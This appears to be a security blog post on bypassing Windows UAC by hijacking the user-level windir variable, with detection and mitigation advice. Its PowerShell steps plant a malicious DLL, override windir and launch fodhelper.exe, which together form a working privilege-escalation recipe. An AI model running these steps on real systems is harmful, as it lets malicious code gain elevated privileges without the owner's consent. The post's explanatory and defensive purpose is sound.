# UAC Bypass via Environment Variables

> **Tags:** Windows Internals, UAC  
> **Date:** 2025-02

---

## Overview

User Account Control (UAC) is a Windows security feature designed to prevent unauthorized changes to the operating system. However, certain auto-elevating binaries can be abused to bypass UAC entirely — no admin credentials required.

In this post, we explore a technique that leverages environment variable manipulation to hijack the execution flow of trusted, auto-elevating Windows binaries.

---

## The Technique

### Auto-Elevating Binaries

Windows ships with certain executables that are configured to auto-elevate without prompting the user. These binaries are signed by Microsoft and have the `autoElevate` property set to `true` in their manifest.

```xml
<requestedExecutionLevel level="highestAvailable" uiAccess="false"/>
<autoElevate>true</autoElevate>
```

### Environment Variable Hijacking

Some auto-elevating binaries resolve paths using environment variables like `%windir%` or `%systemroot%`. By manipulating the **current user's** environment variables (which don't require admin rights), we can redirect these paths:

```powershell
# Create a mock directory structure
New-Item -ItemType Directory -Path "C:\Users\$env:USERNAME\mock\System32" -Force

# Place malicious DLL
Copy-Item evil.dll "C:\Users\$env:USERNAME\mock\System32\target.dll"

# Override windir for current user
[Environment]::SetEnvironmentVariable("windir", "C:\Users\$env:USERNAME\mock", "User")
```

### Triggering Execution

When the auto-elevating binary is launched, it resolves `%windir%\System32\target.dll` to our malicious path, loading our DLL with elevated privileges.

```powershell
# Trigger the auto-elevating binary
Start-Process "fodhelper.exe"
```

---

## Detection

- Monitor changes to user-level environment variables (`windir`, `systemroot`)
- Watch for unusual child processes of auto-elevating binaries
- Sysmon Event ID 13 (Registry Value Set) on `HKCU\Environment`

---

## Mitigation

- Set UAC to "Always Notify"
- Monitor and alert on environment variable modifications
- Use application whitelisting (AppLocker / WDAC)
